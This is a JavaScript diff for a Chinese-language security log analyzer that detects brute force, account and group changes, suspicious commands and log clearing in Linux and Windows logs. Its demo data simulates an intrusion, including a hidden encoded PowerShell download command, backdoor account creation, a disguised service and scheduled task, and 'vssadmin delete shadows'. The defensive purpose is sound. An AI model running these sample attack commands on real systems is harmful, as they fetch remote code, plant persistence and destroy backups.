+    else if((m=/^\s*(\S+) : user NOT in sudoers/.exec(msg)))E('priv','high',m[1],'','沒有 sudo 權限的帳號嘗試使用 sudo：'+short(msg.replace(/^.*COMMAND=/,''),200),{fail:1});
+    else if((m=/^\s*(\S+) : command not allowed/.exec(msg)))E('priv','med',m[1],'','嘗試用 sudo 執行未被允許的指令：'+short(msg.replace(/^.*COMMAND=/,''),200),{fail:1});
+    else if((m=/authentication failure;.*?\buser=(\S+)/.exec(msg)))E('priv','med',m[1],'','sudo 密碼驗證失敗',{fail:1});
+    return;}
+  if(p==='su'||p==='su-l'){st.has.lauth=1;
+    if((m=/^\(to (\S+)\) (\S+) on/.exec(msg))||(m=/session opened for user (\S+?)(?:\(uid=\d+\))? by (\S*?)(?:\(uid=\d+\))?$/.exec(msg))){
+      const key=m[1]+'|'+m[2]+'|'+Math.floor(t/3000);if(st.lastSu===key)return;st.lastSu=key;
+      E('priv',m[1]==='root'?'low':'info',m[2],'','使用 su 切換成「'+m[1]+'」身分');}
+    else if((m=/^FAILED SU \(to (\S+)\) (\S+) on/i.exec(msg))||(m=/^FAILED su for (\S+) by (\S+)/.exec(msg)))E('priv','med',m[2],'','使用 su 切換成「'+m[1]+'」失敗（密碼錯誤）',{fail:1});
+    return;}
+  if(p==='useradd'||p==='adduser'){st.has.lauth=1;if((m=/new user: name=([^,]+), UID=(\d+)/.exec(msg)))E('acct',m[2]==='0'?'high':'med',m[1],'','新增帳號「'+m[1]+'」'+(m[2]==='0'?'（UID=0，等同 root 權限！）':''),{op:'create'});return;}
+  if(p==='userdel'){st.has.lauth=1;if((m=/delete user '([^']+)'/.exec(msg)))E('acct','med',m[1],'','刪除帳號「'+m[1]+'」',{op:'delete'});return;}
+  if(p==='usermod'||p==='gpasswd'){st.has.lauth=1;
+    if((m=/add '([^']+)' to group '([^']+)'/.exec(msg))||(m=/user (\S+) added by \S+ to group (\S+)/.exec(msg)))E('group',SUDOGRP.test(m[2])?'high':'med',m[1],'','把「'+m[1]+'」加入群組「'+m[2]+'」',{grp:m[2],add:1});
+    else if((m=/change user '([^']+)' (.*)/.exec(msg)))E('acct','low',m[1],'','變更帳號「'+m[1]+'」設定：'+short(m[2],100),{op:'change'});
+    return;}
+  if(p==='passwd'||p==='chpasswd'||p==='chage'){st.has.lauth=1;if((m=/password changed for (\S+)/.exec(msg)))E('acct','low',m[1],'','帳號「'+m[1]+'」的密碼被變更',{op:'reset'});return;}
+  if(p==='cron'||p==='crond'||p==='crontab'){
+    if((m=/\((\S+)\) CMD \((.*)\)$/.exec(msg))){const why=suspect(SUSP_LNX,m[2]);if(why)E('proc','high',m[1],'','排程自動執行可疑指令（'+why+'）：'+short(m[2],300));}
+    else if((m=/\((\S+)\) REPLACE \((\S+)\)/.exec(msg)))E('task','low',m[1],'','修改「'+m[2]+'」的排程工作 (crontab)');
+    return;}
+  if(p==='kernel'){st.has.lsys=1;
+    if(/^(\[\s*[\d.]+\]\s*)?Linux version /.test(msg))E('power','info','','','系統開機');
+    else if(/Out of memory: Kill/.test(msg))E('crash','low','','','記憶體不足，系統強制結束程式：'+short(msg,160));
+    else if(/entered promiscuous mode/.test(msg))E('proc','med','','','網路卡進入混雜模式（可能有人在側錄網路封包）：'+short(msg,120));
+    else if((m=/\[UFW BLOCK\].*?SRC=(\S+)/.exec(msg))||(m=/(?:DROP|REJECT|BLOCK)\S*\s.*?SRC=(\S+)/.exec(msg)))inc(st.fwBlock,m[1]);
+    return;}
+  if(p==='systemd'||p==='systemd-logind'){st.has.lsys=1;
+    if(/System is (rebooting|powering down)|Reached target (Reboot|Power-Off|Shutdown)|Shutting down\.$/.test(msg))E('power','info','','','系統關機/重新啟動');
+    else if((m=/^(\S+\.service): (?:Failed with result|Main process exited, code=(?:killed|dumped))/.exec(msg)))E('crash','info','','','服務 '+m[1]+' 異常中止');
+    return;}
+  if((m=/pam_unix\(([^:]+):auth\): authentication failure;/.exec(msg))){st.has.lauth=1;
+    const u=(/\buser=(\S+)/.exec(msg)||[])[1]||'',ip=(/\brhost=(\S+)/.exec(msg)||[])[1]||'';
+    E('fail','info',u,ip,'登入失敗（'+m[1]+'）：密碼錯誤',{lt:m[1]==='login'?'console':'other',reason:'密碼錯誤'});return;}
+  if(p==='login'||/^gdm|^lightdm|^sddm/.test(p)){st.has.lauth=1;
+    if((m=/session opened for user (\S+?)(?:\(uid=\d+\))?(?: by|$)/.exec(msg)))E('ok','info',m[1],'','在主機前登入成功',{lt:'console'});
+    else if((m=/FAILED LOGIN .* FOR '?([^',]+)'?/.exec(msg)))E('fail','info',m[1],'','主機前登入失敗',{lt:'console',reason:'密碼錯誤'});}
+}
+
+/* ───────────── 檔案讀取 ───────────── */
+async function sniffEnc(file){const b=new Uint8Array(await file.slice(0,65536).arrayBuffer());
+  if(b[0]===0xff&&b[1]===0xfe)return 'utf-16le';if(b[0]===0xfe&&b[1]===0xff)return 'utf-16be';if(b[0]===0xef&&b[1]===0xbb)return 'utf-8';
+  let z=0;for(let i=1;i<Math.min(b.length,2000);i+=2)if(b[i]===0)z++;if(z>300)return 'utf-16le';
+  try{new TextDecoder('utf-8',{fatal:true}).decode(b.subarray(0,b.length-4));return 'utf-8';}catch(e){return 'big5';}}
+async function readText(file,enc,onText,onp){const dec=new TextDecoder(enc),STEP=4<<20;
+  for(let off=0;off<file.size;off+=STEP){const buf=await file.slice(off,off+STEP).arrayBuffer();
+    onText(dec.decode(buf,{stream:true}));if(onp)onp(Math.min(1,(off+STEP)/file.size));await new Promise(r=>setTimeout(r,0));}
+  onText(dec.decode());}
+async function ingestFile(st,file,onp,name,ref){
+  name=name||file.name||'檔案';ref=ref||file.lastModified||Date.now();
+  const head=new Uint8Array(await file.slice(0,8).arrayBuffer());
+  if(head[0]===0x1f&&head[1]===0x8b){const blob=await new Response(file.stream().pipeThrough(new DecompressionStream('gzip'))).blob();return ingestFile(st,blob,onp,name,ref);}
+  const info={name,size:file.size,type:'',n:0,err:0,msg:''};st.files.push(info);const before=st.total;
+  try{
+    if(String.fromCharCode(...head.subarray(0,7))==='ElfFile'){info.type='Windows 事件記錄 (EVTX)';await readEvtx(st,file,info,onp);}
+    else{
+      const enc=await sniffEnc(file);let mode='',buf='',csv=null,rowFn=null,bad=0,good=0;
+      await readText(file,enc,text=>{
+        if(!mode){const s=(buf+text).replace(/^\ufeff/,'').trimStart();if(s.length<200&&text!==''){buf=s;return;}
+          const first=s.slice(0,s.indexOf('\n')>0?s.indexOf('\n'):400);
+          if(s[0]==='<'){mode='xml';info.type='Windows 事件記錄 (XML)';}
+          else if(/事件識別碼|Event ?ID|TimeCreated|InstanceId|^#TYPE/i.test(first)&&first.includes(',')||/^#TYPE/.test(first)){mode='csv';info.type='Windows 事件記錄 (CSV，資訊有限)';rowFn=csvIngester(st,info);csv=csvStream(r=>rowFn(r));}
+          else{mode='linux';info.type='Linux 系統記錄';}
+          text=s;buf='';}
+        if(mode==='xml'){buf+=text;let i,from=0;
+          while((i=buf.indexOf('</Event>',from))>=0){const s=buf.lastIndexOf('<Event',i);const a=buf.indexOf('<Event',from);
+            if(a>=0&&a<i)xmlEvent(st,buf.slice(a,i+8));from=i+8;}
+          buf=buf.slice(from);if(buf.length>8e6)buf='';}
+        else if(mode==='csv')csv.feed(text);
+        else{buf+=text;let i,from=0;
+          while((i=buf.indexOf('\n',from))>=0){const line=buf.slice(from,buf[i-1]==='\r'?i-1:i);from=i+1;if(!line)continue;
+            if(linuxLine(st,line,ref))good++;else bad++;}
+          buf=buf.slice(from);}
+      },onp);
+      if(mode==='csv')csv.end();
+      if(mode==='linux'){if(buf&&linuxLine(st,buf,ref))good++;if(!good){info.type='無法辨識';info.msg='看不出這是哪一種記錄檔格式';}else info.err=bad;}
+    }
+  }catch(e){info.msg=String(e&&e.message||e);}
+  info.n=st.total-before;return info;
+}
+function ingestLinuxText(st,text,ref){for(const l of text.split(/\r?\n/))if(l)linuxLine(st,l,ref||Date.now());}
+
+/* ───────────── 分析 ───────────── */
+const CHECKS=[
+ ['brute','密碼猜測／暴力破解攻擊',['sec','lauth']],
+ ['saf','多次失敗後登入成功（疑似被猜中密碼）',['sec','lauth']],
+ ['ext','來自網際網路的成功登入',['sec','lauth','rdp']],
+ ['off','非上班時間登入',['sec','lauth']],
+ ['admin','最高權限帳號（Administrator / root）直接登入',['sec','lauth']],
+ ['priv','特權操作（sudo / su / 管理員權限）',['sec','lauth']],
+ ['acct','帳號新增、刪除、密碼重設',['sec','lauth']],
+ ['group','管理者群組成員異動',['sec','lauth']],
+ ['lock','帳號被鎖定',['sec']],
+ ['logclr','記錄檔遭清除',['sec','sys','lauth']],
+ ['policy','稽核／安全原則變更',['sec']],
+ ['keep','記錄保存期間（建議至少 6 個月）',['sec','lauth']],
+ ['svc','新安裝的服務',['sec','sys']],
+ ['task','排程工作異動',['sec','task','lauth']],
+ ['proc','可疑指令或程式執行',['sec','ps','lauth']],
+ ['mal','惡意程式偵測／防毒被停用',['def','sys']],
+ ['fw','防火牆異動',['sec','lsys']],
+ ['power','異常關機／重新開機',['sys','lsys']],
+ ['time','系統時間被變更',['sec']],
+];
+const NEED={sec:'Windows 安全性 (Security) 記錄',sys:'Windows 系統 (System) 記錄',lauth:'Linux 驗證記錄 (auth.log / secure)',lsys:'Linux 系統記錄 (syslog / messages)',def:'Windows Defender 記錄',ps:'PowerShell 記錄',task:'工作排程器記錄',rdp:'遠端桌面記錄'};
+const top=(m,n=10)=>[...m.entries()].sort((a,b)=>b[1]-a[1]).slice(0,n);
+function analyze(st,opt){
+  opt=Object.assign({ws:8,we:18,thr:10},opt||{});
+  const evs=st.evs;evs.sort((a,b)=>a.t-b.t);
+  const A={ok:0,fail:0,okUser:new Map(),failUser:new Map(),failIp:new Map(),okIp:new Map(),reason:new Map(),ltype:new Map(),
+    daily:new Map(),hourly:new Map(),heatOk:new Array(168).fill(0),heatFail:new Array(168).fill(0),kinds:new Map(),sevN:[0,0,0,0,0]};
+  const by={};const recent=new Map(),saf=[],ext=new Map(),off=[],offUser=new Map(),admin=new Map(),pwssh=new Map(),ipInfo=new Map();
+  const bump=(map,idx,i)=>{let v=map.get(idx);if(!v){v=[0,0];map.set(idx,v);}v[i]++;};
+  const isAdm=e=>e.os==='l'?e.u==='root':/^(administrator|admin|系統管理員)$/i.test(e.u.replace(/^.*\\/,''));
+  for(const e of evs){
+    inc(A.kinds,e.k);(by[e.k]||(by[e.k]=[])).push(e);
+    if(e.k!=='ok'&&e.k!=='fail')continue;
+    const lt=(e.x&&e.x.lt)||'',loc=e.t-TZ,di=Math.floor(loc/DAY),hr=Math.floor((loc-di*DAY)/HOUR),wd=((di+3)%7+7)%7,hi=Math.floor(loc/HOUR);
+    const key=e.ip||('u:'+e.u+'@'+e.h);
+    if(e.k==='ok'){A.ok++;inc(A.okUser,e.u);if(e.ip)inc(A.okIp,e.ip);inc(A.ltype,LT[lt]||lt||'其他');bump(A.daily,di,0);bump(A.hourly,hi,0);A.heatOk[wd*24+hr]++;
+      const inter=e.os==='l'||lt==='2'||lt==='10'||lt==='11'||lt==='12';
+      if(inter&&(hr<opt.ws||hr>=opt.we||wd>=5)){off.push(e);inc(offUser,e.u);}
+      if(isPub(e.ip))inc(ext,e.ip+'|'+e.u);
+      if(isAdm(e)&&lt!=='7'&&lt!=='13')inc(admin,e.u+(e.ip?'|'+e.ip:'|本機')+'|'+(LT[lt]||lt));
+      if(e.x&&e.x.pw)inc(pwssh,e.u);
+      const arr=recent.get(key);if(arr){const n=arr.filter(x=>e.t-x<=HOUR).length;if(n>=5)saf.push({t:e.t,u:e.u,ip:e.ip,h:e.h,n});recent.delete(key);}
+    }else{A.fail++;inc(A.failUser,e.u||'(空白)');inc(A.reason,(e.x&&e.x.reason)||'其他');bump(A.daily,di,1);bump(A.hourly,hi,1);A.heatFail[wd*24+hr]++;
+      if(e.ip){inc(A.failIp,e.ip);let o=ipInfo.get(e.ip);if(!o){o={users:new Set(),first:e.t,last:e.t};ipInfo.set(e.ip,o);}o.users.add(e.u);o.last=e.t;}
+      let arr=recent.get(key);if(!arr){arr=[];recent.set(key,arr);}arr.push(e.t);if(arr.length>300)arr.shift();
+    }
+  }
+  const F=[];
+  const add=(sev,chk,title,what,advice,table,filt)=>F.push({sev,chk,title,what,advice,table,filt});
+  const worst=l=>l.reduce((a,e)=>SEV[e.sev]>SEV[a]?e.sev:a,'info');
+  const evTable=(l,n=15)=>({cols:['時間','主機','帳號','說明'],rows:l.slice(-n).reverse().map(e=>[fmt(e.t),e.h,e.u,e.m]),more:Math.max(0,l.length-n)});
+  const T=opt.thr;
+  // 暴力破解
+  const bip=top(A.failIp,1e9).filter(x=>x[1]>=T);
+  if(bip.length){const pub=bip.filter(x=>isPub(x[0])).length;
+    add('high','brute','有 '+bip.length+' 個來源 IP 大量嘗試登入失敗（疑似猜密碼攻擊）',
+      '同一個來源在短時間內不斷輸入錯誤的帳號密碼，通常是駭客或惡意程式在「猜密碼」。'+(pub?'其中 '+pub+' 個來自網際網路，代表這台主機的登入服務直接暴露在外網。':'這些來源都在內部網路，可能是內部有電腦中毒，或某個程式/服務存了舊密碼不斷重試。'),
+      '①在防火牆封鎖這些 IP；②確認遠端桌面 (3389) / SSH (22) 是否真的需要對外開放，不需要就關閉或改走 VPN；③啟用帳號鎖定原則與強密碼；④內網來源請找出該電腦檢查是否中毒或設定了過期密碼。',
+      {cols:['來源 IP','位置','失敗次數','嘗試的帳號數','最早','最晚'],rows:bip.slice(0,20).map(([ip,n])=>{const o=ipInfo.get(ip);return [ip,isPub(ip)?'外網':'內網',n,o.users.size,fmt(o.first),fmt(o.last)];}),more:Math.max(0,bip.length-20)},{k:'fail'});}
+  const spray=[...ipInfo.entries()].filter(([ip,o])=>o.users.size>=5&&A.failIp.get(ip)<T);
+  if(spray.length)add('med','brute','有 '+spray.length+' 個來源嘗試了多個不同帳號（疑似帳號探測）','同一來源用很多不同的帳號名稱嘗試登入，是在「試哪些帳號存在」。','封鎖來源 IP，並確認沒有使用常見帳號名稱（admin、test、user）搭配弱密碼。',
+      {cols:['來源 IP','位置','嘗試的帳號數','失敗次數'],rows:spray.slice(0,15).map(([ip,o])=>[ip,isPub(ip)?'外網':'內網',o.users.size,A.failIp.get(ip)])},{k:'fail'});
+  const bu=top(A.failUser,1e9).filter(x=>x[1]>=T*3&&!bip.length);
+  if(bu.length)add('med','brute','有 '+bu.length+' 個帳號登入失敗次數偏高','記錄中沒有來源 IP，但這些帳號累積了大量登入失敗。可能是有人在主機前或透過服務猜密碼，也可能是排程/服務存了舊密碼。','確認是否有服務或排程使用了過期的密碼；若不是，請變更這些帳號的密碼。',
+      {cols:['帳號','失敗次數'],rows:bu.slice(0,15)},{k:'fail'});
+  if(saf.length)add('crit','saf','發現 '+saf.length+' 次「連續失敗後登入成功」— 密碼可能已被猜中',
+      '同一個來源先連續登入失敗很多次，接著就登入成功了。這是密碼被猜中的典型跡象（當然也可能是本人一直打錯密碼，需要向帳號持有人確認）。',
+      '①立刻向帳號持有人確認當時是否為本人操作；②若非本人：立即變更密碼、中斷該連線、檢查登入後做了什麼（看下方同時段的事件）；③視情況通報資安事件。',
+      {cols:['成功登入時間','主機','帳號','來源 IP','之前一小時內失敗次數'],rows:saf.slice(-20).reverse().map(s=>[fmt(s.t),s.h,s.u,s.ip||'(本機)',s.n]),more:Math.max(0,saf.length-20)},{k:'ok'});
+  if(ext.size)add('high','ext','有來自網際網路 (外網 IP) 的成功登入，共 '+[...ext.values()].reduce((a,b)=>a+b,0)+' 次',
+      '有人從公司外部的網路位址成功登入這台主機。如果這台主機不應該對外提供登入，這就是異常。',
+      '逐一確認這些 IP 是否為已知來源（員工在家、廠商維護、VPN 出口）。無法確認的，視為入侵處理：變更該帳號密碼並檢查登入後的操作。',
+      {cols:['來源 IP','帳號','成功次數'],rows:top(ext,20).map(([k,n])=>{const [ip,u]=k.split('|');return [ip,u,n];}),more:Math.max(0,ext.size-20)},{k:'ok'});
+  if(off.length)add('low','off','非上班時間有 '+off.length+' 次登入（'+opt.ws+':00–'+opt.we+':00 以外或假日）',
+      '在下班時間或假日有人登入主機。可能是加班或排程維護，也可能是未經授權的使用。','請對照下表帳號與時間，確認是否為已知的加班或維護作業。',
+      {cols:['帳號','非上班時間登入次數'],rows:top(offUser,15)},{k:'ok'});
+  if(admin.size){const lnx=[...admin.keys()].some(k=>k.startsWith('root|'));
+    add(lnx?'high':'med','admin','最高權限帳號被直接用來登入（共 '+[...admin.values()].reduce((a,b)=>a+b,0)+' 次）',
+      '內建的 Administrator / root 是權限最大的帳號，也是駭客最愛猜的帳號。直接用它登入，出事時也無法分辨是誰做的。',
+      '建議每位管理者使用自己的具名帳號，需要時再提升權限 (sudo / UAC)；Linux 請在 sshd_config 設定 PermitRootLogin no；Windows 可將內建 Administrator 改名或停用。',
+      {cols:['帳號','來源','方式','次數'],rows:top(admin,15).map(([k,n])=>k.split('|').concat(n))},{k:'ok'});}
+  if(pwssh.size)add('info','admin','SSH 有使用「密碼」登入（非金鑰）','用密碼登入 SSH 比較容易被猜中；用金鑰登入比較安全。','建議改用 SSH 金鑰並關閉密碼登入 (PasswordAuthentication no)。',{cols:['帳號','密碼登入次數'],rows:top(pwssh,15)},{k:'ok'});
+  const g=k=>by[k]||[];
+  const simple=(k,chk,title,what,advice,minSev)=>{const l=g(k);if(!l.length)return;let s=worst(l);if(minSev&&SEV[minSev]>SEV[s])s=minSev;add(s,chk,title.replace('#',l.length),what,advice,evTable(l),{k});};
+  simple('logclr','logclr','記錄檔被清除（# 次）','有人把事件記錄整個清掉。正常維運很少這樣做；入侵者常用這招湮滅證據。','確認是誰、為什麼清除。若無正當理由，應視為資安事件；並建議把記錄即時轉送到另一台記錄伺服器 (SIEM / syslog)。','crit');
+  simple('mal','mal','防毒軟體偵測到惡意程式（# 筆）','防毒軟體在這台主機上發現了病毒或惡意程式。','確認防毒是否已成功清除（看說明欄），對主機做完整掃描，並追查檔案是怎麼進來的。');
+  simple('avoff','mal','防毒或安全服務被停用／變更（# 筆）','防毒的即時保護或相關安全服務被關閉。除非是管理者刻意操作，否則常是惡意程式為了不被發現而做的。','確認是否為管理者操作；立即重新啟用保護並做完整掃描。');
+  simple('proc','proc','發現可疑的指令或程式執行（# 筆）','主機上執行了符合「駭客常用手法」特徵的指令，例如隱藏編碼的指令、下載執行外部程式、竊取密碼、刪除備份等。也可能是管理工具的正常行為，需要人工確認。','請管理者逐筆確認是否為已知的維運指令。無法解釋的，應保留證據並進一步調查。');
+  { const l=g('group').filter(e=>e.x&&e.x.add);if(l.length)add(worst(l),'group','有帳號被加入群組（'+l.length+' 筆）'+(l.some(e=>e.sev==='high')?'，包含管理者群組':''),'把帳號加入管理者群組，等於給它主機的最高權限。入侵者取得控制後常會這樣替自己留後門。','確認每一筆是否有申請紀錄、是否為已知的管理者。',evTable(l),{k:'group'}); }
+  { const l=g('acct').filter(e=>e.x&&/create|delete|reset|rename/.test(e.x.op)||SEV[e.sev]>=3);if(l.length)add(worst(l),'acct','帳號有異動：新增 '+l.filter(e=>e.x.op==='create').length+'、刪除 '+l.filter(e=>e.x.op==='delete').length+'、重設密碼 '+l.filter(e=>e.x.op==='reset').length+' 筆','帳號被新增、刪除或重設密碼。這是定檢必看的項目：每一筆都應該對得上申請單。','對照帳號申請/異動紀錄；找不到依據的新帳號應立即停用並調查。',evTable(l),{k:'acct'}); }
+  simple('policy','policy','稽核或安全原則被變更（# 筆）','決定「哪些事情要留下記錄」或「誰有什麼權限」的設定被改了。若被關閉，之後的異常行為就不會被記錄。','確認是否為核准的設定變更，並檢查目前稽核原則是否仍符合要求。');
+  { const l=g('svc'),bad=l.filter(e=>e.sev==='high');if(l.length)add(bad.length?'high':'low','svc','新安裝了 '+l.length+' 個服務'+(bad.length?'，其中 '+bad.length+' 個位置或啟動方式可疑':''),'「服務」是開機就會自動在背景執行的程式。安裝軟體時會新增服務屬正常，但惡意程式也常把自己裝成服務以便長期潛伏。','確認每個服務是否來自已知的軟體安裝。執行檔放在 Temp、使用者資料夾，或用 cmd / powershell 啟動的要特別注意。',evTable(bad.length?bad:l),{k:'svc'}); }
+  simple('task','task','排程工作有異動（# 筆）','有排程工作被建立、修改或刪除。排程會定時自動執行程式，也是惡意程式常用的潛伏方式。','確認排程名稱與執行內容是否為已知的維運作業。');
+  simple('lock','lock','帳號被鎖定（# 次）','帳號因為密碼連續輸入錯誤而被系統鎖定。可能是使用者忘記密碼，也可能是有人在猜這個帳號的密碼。','若同一帳號反覆被鎖定，請追查來源電腦。');
+  { const l=g('priv').filter(e=>e.x&&e.x.fail);if(l.length)add(worst(l),'priv','提升權限失敗（'+l.length+' 次）','有人嘗試用 sudo / su 取得管理者權限但失敗（密碼錯誤或沒有權限）。','確認是否為管理者打錯密碼；若是一般帳號嘗試，請了解原因。',evTable(l),{k:'priv'}); }
+  { const l=g('priv').filter(e=>!(e.x&&e.x.fail));if(l.length){const m=new Map();l.forEach(e=>inc(m,e.u));add('info','priv','特權使用紀錄：'+m.size+' 個帳號共 '+l.length+' 次','這些帳號曾以管理者權限登入或執行指令。這是正常的管理行為，列出來供您確認名單是否合理。','確認名單上都是應該擁有管理者權限的人。',{cols:['帳號','次數'],rows:top(m,15)},{k:'priv'});} }
+  { const l=g('dcfail');if(l.length>=T)add('med','brute','網域帳號驗證失敗 '+l.length+' 次','網域控制站記錄到大量帳號驗證失敗，可能是有人對網域帳號猜密碼。','查看失敗最多的帳號與來源，確認是否為攻擊或設定錯誤。',evTable(l),{k:'dcfail'}); }
+  { const l=g('rdp');if(l.length){const m=new Map();l.forEach(e=>inc(m,(e.ip||'?')+'|'+e.u));const pub=[...m.keys()].filter(k=>isPub(k.split('|')[0]));
+      add(pub.length?'high':'info','ext','遠端桌面連線紀錄：'+m.size+' 組來源/帳號'+(pub.length?'，其中 '+pub.length+' 組來自外網':''),'列出曾經用遠端桌面連進這台主機的來源。','確認每個來源 IP 都是已知的電腦。遠端桌面不建議直接對網際網路開放。',{cols:['來源 IP','位置','帳號','次數'],rows:top(m,20).map(([k,n])=>{const [ip,u]=k.split('|');return [ip,isPub(ip)?'外網':'內網',u,n];})},{k:'rdp'});} }
+  { const l=g('share');if(l.length)add('low','priv','系統管理共用 (C$ / ADMIN$) 被存取 '+l.length+' 次','管理共用可以從遠端直接讀寫整顆磁碟，一般使用者不會用到；駭客在內網橫向移動時常使用。','確認存取來源是否為管理者或備份/派送系統。',evTable(l),{k:'share'}); }
+  { const l=g('fw'),hi=l.filter(e=>SEV[e.sev]>=1);if(l.length)add(worst(l)==='info'?'info':worst(l),'fw','防火牆規則或設定有異動（'+l.length+' 筆）','防火牆規則被新增、修改或刪除。安裝軟體時自動新增規則很常見，但也要留意是否有人刻意開洞。','檢視新增的規則名稱是否為已知軟體；防火牆被關閉或服務被停止則需立即處理。',evTable(hi.length?hi:l),{k:'fw'}); }
+  { const l=g('power').filter(e=>e.sev!=='info');if(l.length)add('low','power','發生 '+l.length+' 次非預期關機或重啟','主機曾經沒有正常關機就停止運作（當機、斷電、被強制關閉）。','確認是否對應已知的停電或硬體問題；無法解釋的重啟應進一步調查。',evTable(l),{k:'power'}); }
+  simple('time','time','系統時間被手動變更（# 次）','有人手動調整了主機時間。時間不正確會讓記錄的先後順序失真，也可能是為了規避追查。','確認主機有設定自動校時 (NTP)，並了解手動調整的原因。');
+  { const sc=top(st.scan,15);const tot=[...st.scan.values()].reduce((a,b)=>a+b,0);if(tot>=20)add('info','brute','SSH 服務被掃描探測 '+tot+' 次（'+st.scan.size+' 個來源）','有來源連上 SSH 後沒有完成登入就斷線，多半是網路上的自動掃描程式在找目標。對外開放的主機幾乎都會遇到。','若主機不需對外提供 SSH，請在防火牆限制來源；可安裝 fail2ban 自動封鎖。',{cols:['來源 IP','次數'],rows:sc}); }
+  { const tot=[...st.fwBlock.values()].reduce((a,b)=>a+b,0);if(tot)add('info','fw','主機防火牆擋下了 '+tot+' 次連線','防火牆記錄到被阻擋的連線，表示防火牆有在運作。','留意是否有內網 IP 大量被擋（可能是內部電腦中毒在掃描）。',{cols:['來源 IP','被擋次數'],rows:top(st.fwBlock,15)}); }
+  // 記錄保存
+  { let span=null,label='';const sc=st.chan.get('Security');
+    if(sc){span=sc;label='Windows 安全性記錄';}else if(st.has.lauth&&st.chan.get('Linux syslog')){span=st.chan.get('Linux syslog');label='Linux 記錄';}
+    if(span){const days=Math.round((span.tmax-span.tmin)/DAY*10)/10;
+      if(days<180)add('low','keep','提供的'+label+'只涵蓋約 '+days+' 天（建議保存至少 6 個月）','依常見的資安規範，主機記錄應至少保存 6 個月。目前提供的檔案只看得到 '+fmt(span.tmin)+' 之後的資料。可能是記錄檔容量上限太小被覆蓋，或只是還有其他封存檔沒提供。','確認是否另有封存的舊記錄；若沒有，請調大記錄檔上限或把記錄轉送到集中記錄伺服器保存。',{cols:['項目','內容'],rows:[['最早一筆',fmt(span.tmin)],['最晚一筆',fmt(span.tmax)],['涵蓋天數',days],['事件數',span.n]]});} }
+  if(st.has.sec&&!st.has.logon&&(st.chan.get('Security')||{n:0}).n>500)add('med','policy','安全性記錄中完全沒有登入事件','安全性記錄裡找不到任何登入成功/失敗的紀錄，可能是「稽核登入事件」沒有開啟。這樣即使被入侵也無從查起。','在群組原則啟用「稽核登入事件」的成功與失敗。',null);
+  F.sort((a,b)=>SEV[b.sev]-SEV[a.sev]);
+  for(const f of F)A.sevN[SEV[f.sev]]++;
+  const checks=CHECKS.map(([id,name,need])=>{const avail=need.some(n=>st.has[n]);const fs=F.filter(f=>f.chk===id);
+    if(!fs.length)return{id,name,status:avail?'ok':'na',note:avail?'未發現異常':'需要：'+need.map(n=>NEED[n]).join(' 或 ')};
+    const w=fs[0].sev;return{id,name,status:SEV[w]>=3?'bad':SEV[w]===2?'warn':'note',note:fs.map(f=>f.title).join('；')};});
+  return{A,F,checks,isPub};
+}
+
+/* ───────────── 示範資料 ───────────── */
+function demo(st){
+  let seed=7;const rnd=()=>(seed=(seed*1103515245+12345)&0x7fffffff)/0x7fffffff;const pick=a=>a[Math.floor(rnd()*a.length)];
+  const now=Date.now(),d0=new Date(now);d0.setHours(0,0,0,0);const base=d0.getTime();
+  const W=(t,id,d,prov,ch,da)=>ingestWin(st,{t,id,d:d||{},da:da||[],prov:prov||'Microsoft-Windows-Security-Auditing',ch:ch||'Security',comp:'SRV-FILE01'});
+  const users=[['alice','192.168.1.21'],['bob','192.168.1.34'],['王小明','192.168.1.57'],['svc_backup','192.168.1.10']];
+  for(let day=20;day>=0;day--){const b=base-day*DAY,wd=new Date(b).getDay();if(wd===0||wd===6)continue;
+    for(const [u,ip] of users){const n=1+Math.floor(rnd()*3);for(let i=0;i<n;i++){const t=b+(8.5+rnd()*8.5)*HOUR;
+      W(t,4624,{TargetUserName:u,LogonType:pick(['3','3','10','2']),IpAddress:ip,WorkstationName:'PC-'+u.toUpperCase()});
+      if(rnd()<.12)W(t-60000,4625,{TargetUserName:u,LogonType:'3',IpAddress:ip,Status:'0xc000006d',SubStatus:'0xc000006a'});}
+      for(let i=0;i<6;i++)W(b+rnd()*DAY,4624,{TargetUserName:'SYSTEM',LogonType:'5'});}
+    W(b+9*HOUR,4672,{SubjectUserName:'alice'});}
+  const atk=base-3*DAY+1.2*HOUR,aip='185.220.101.45';
+  for(let i=0;i<420;i++)W(atk+i*17000+rnd()*9000,4625,{TargetUserName:pick(['administrator','administrator','admin','test','user','guest','backup','sql']),LogonType:'10',IpAddress:aip,Status:'0xc000006d',SubStatus:pick(['0xc000006a','0xc0000064','0xc000006a'])});
+  let t=atk+421*17000;
+  W(t,4624,{TargetUserName:'Administrator',LogonType:'10',IpAddress:aip,WorkstationName:'kali'});W(t+1000,4672,{SubjectUserName:'Administrator'});
+  W(t+3e5,4720,{TargetUserName:'helpdesk2',SubjectUserName:'Administrator'});
+  W(t+3.3e5,4732,{TargetUserName:'Administrators',MemberName:'SRV-FILE01\\helpdesk2',SubjectUserName:'Administrator'});
+  W(t+5e5,4688,{SubjectUserName:'Administrator',NewProcessName:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',CommandLine:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'});
+  W(t+6e5,7045,{ServiceName:'WinUpdSvc',ImagePath:'C:\\Users\\Public\\upd.exe -k',AccountName:'LocalSystem'},'Service Control Manager','System');
+  W(t+6.5e5,4698,{SubjectUserName:'Administrator',TaskName:'\\Microsoft\\Windows\\Updater',TaskContent:'<Task><Exec><Command>C:\\ProgramData\\u.bat</Command></Exec></Task>'});
+  W(t+7e5,5001,{},'Microsoft-Windows-Windows Defender','Microsoft-Windows-Windows Defender/Operational');
+  W(t+7.2e5,1116,{'Threat Name':'HackTool:Win32/Mimikatz.D','Path':'file:_C:\\Users\\Public\\m.exe','Detection User':'SRV-FILE01\\Administrator'},'Microsoft-Windows-Windows Defender','Microsoft-Windows-Windows Defender/Operational');
+  W(t+8e5,4688,{SubjectUserName:'Administrator',CommandLine:'vssadmin.exe delete shadows /all /quiet'});
+  W(t+9e5,1102,{SubjectUserName:'Administrator'},'Microsoft-Windows-Eventlog','Security');
+  W(base-6*DAY+14*HOUR,4740,{TargetUserName:'bob',TargetDomainName:'PC-BOB'});
+  W(base-9*DAY+7*HOUR,6008,{},'EventLog','System');
+  W(base-5*DAY+22.5*HOUR,4624,{TargetUserName:'bob',LogonType:'10',IpAddress:'192.168.1.34'});
